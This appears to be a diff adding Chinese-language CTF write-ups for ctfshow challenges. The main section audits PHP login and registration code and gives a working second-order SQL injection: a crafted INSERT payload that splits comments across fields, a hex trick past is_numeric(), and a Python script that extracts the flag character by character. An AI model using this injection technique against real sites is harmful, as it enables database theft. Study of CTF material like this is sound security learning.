@@ -50,7 +50,7 @@ echo json_encode($ret);
 return;
 ```
 
-##### 阅读源码
+##### 代码审计
 
 首先有一个对token的判断，于是我们抓包看看，
 
@@ -234,3 +234,87 @@ print("password:"+password)
 最后得到密码:`cptbtptpbcptdtptp`
 
 登录得flag：`ctfshow{9cbc6211-d74d-4ee0-8055-2d434614e27b}`
+
+
+
+#### 一切都看起来那么合情合理
+
+##### 信息收集
+
+​		源码，无。扫，有。压缩包，解压，代码审计。
+
+##### 代码审计
+
+​		审了半天啥也没审出来。看来别人题解，发现是PHP的session反序列化，没接触过，学习一下。[PHPsession发序列化](https://xz.aliyun.com/t/6640)。
+
+​		
+
+
+
+#### 内部赛-签到
+
+##### 信息收集
+
+​		注册登录，无收获，扫目录，出源码，代码审计。
+
+##### 代码审计
+
+​		有三个界面，`login.php`，`register.php`，`user.php`，首先关注到的是，SQL语句，发现有两处
+
+`$sql ="select username from test1 where email='$e' and password='$p'";`
+
+`$sql ="insert into test1 set email = '$e', username = '$u',password = '$p'";`
+
+可以看到通过email和password选出username，而**username是唯一的回显位**，那么大概率从此处入手。
+
+##### 解题
+
+​		如何构造注入。我们需要用到两处地方，即两次对数据库操作的地方，一处用于插入payload，在`register.php`，一处用于执行payload，在`login.php`，而且只有`login.php`有强过滤，在`register`出可以使用`union select`，还需要注意一点，在`user.php`中使用了`is_numberic()`函数对回显`username`进行了过滤，只能显示数字，但是没关系，这里通过hex编码绕过，**可以查一下，该函数对16进制的字符串当作数字处理。**
+
+代码审懂了，但是脚本编写能力确实还欠佳，参考了一下别的师傅的代码，做了一点修改，直接可以跑出答案
+
+代码解读：
+
+**为什么不直接选出答案，而是通过循环加`substr`，因为回显username有字数限制，也可以稍微改大一点，可以加快flag的产生**
+
+构造出来的SQL：在username处找flag，至于爆表爆字段改一改就行了，**这里很巧妙，通过两段插入点，使用内联注释`/*,username='*/`**，**还有一个注意点，原来的insert的语句使用了换行符，所以p是会被赋值，而不会被#注释掉**
+
+```sql
+insert into test1 set email = '1', username = hex(hex(substr((select/**/flag/**/from/**/flag)from/**/1/**/for/**/1))),/*,
+username='*/#',
+password = '1'
+```
+
+```python
+import requests
+import re
+
+url1 = "http://7580c911-e3e6-47eb-8ca8-83252f9038aa.challenge.ctf.show/register.php"
+url2 = "http://7580c911-e3e6-47eb-8ca8-83252f9038aa.challenge.ctf.show/login.php"
+flag = ''
+for i in range(1, 50):
+    payload = "hex(hex(substr((select/**/flag/**/from/**/flag)from/**/" + str(i) + "/**/for/**/1))),/*"
+    s = requests.session()
+    data1 = {
+        'e': str(i) + "',username=" + payload,
+        'u': "*/#",
+        'p': i
+    }
+    r1 = s.post(url1, data=data1)
+    data2 = {
+        'e': i,
+        'p': i
+    }
+    r2 = s.post(url2, data=data2)
+    t = r2.text
+    try:
+        real = re.findall("Hello (.*?),", t)[0]
+        flag += real
+    except IndexError:
+        strs=bytes.fromhex(flag)
+        strss=bytes.fromhex(strs.decode())
+        print(strss.decode())
+        break
+```
+
+![](D:\0-CTF\Documents\WP\images\ctfshow-内部赛-签到_1.jpg)
